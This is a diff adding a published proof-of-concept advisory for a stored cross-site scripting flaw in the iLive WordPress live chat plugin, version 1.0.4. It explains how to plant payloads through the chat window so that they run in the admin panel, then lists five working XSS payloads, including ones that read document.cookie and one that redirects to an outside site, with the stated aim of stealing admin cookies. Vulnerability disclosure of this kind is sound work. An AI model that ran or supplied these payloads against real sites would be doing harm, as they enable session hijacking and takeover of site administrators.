@@ -1,0 +1,33 @@
+# Exploit Title: iLive - Intelligent WordPress Live Chat Support
+Plugin v1.0.4 Stored XSS Injection
+# Google Dork: -
+# Date: 2019/06/25
+# Exploit Author: m0ze
+# Vendor Homepage: http://www.ilive.wpapplab.com/
+# Software Link:
+https://codecanyon.net/item/ilive-wordpress-live-chat-support-plugin/20496563
+http://www.ilive.wpapplab.com/
+# Version: 1.0.4
+# Tested on: Windows 10 / Parrot OS
+# CVE : -
+
+Info:
+
+Weak security measures like bad textarea data filtering has been
+discovered in the «iLive - Intelligent WordPress Live Chat Support
+Plugin». Current version of this premium WordPress plugin is 1.0.4.
+
+
+
+PoC:
+Go to the demo website http://www.site.com/ and open chat window by clicking on «Chat» icon on the bottom right corner. 
+Use your payload inside input field and press [Enter]. 
+Provided exaple payloads working on the admin area, so it's possible to steal admin cookies or force a redirect to any other website.
+To check your XSS Injections log in http://www.site.com/wp-admin/ and go to this page http://www.site.com/wp-admin/admin.php?page=ilive-chat-page then select your chat alias from the list. Keep in mind that there is 3 demo operators, so you must log in as operator assigned to your chat (operator number will be available after you send the first message in chat).
+
+Example #1: <img src=https://i.imgur.com/zRm8R9z.gif onload=alert(`m0ze`);>
+Example #2: <img src=https://i.imgur.com/zRm8R9z.gif
+onload=alert(document.cookie);>
+Example #3: <img src=x onerror=window.location.replace('https://m0ze.ru/');>
+Example #4: <!--<img src="--><img src=x onerror=(alert)(`m0ze`)//">
+Example #5: <!--<img src="--><img src=x onerror=(alert)(document.cookie)//">
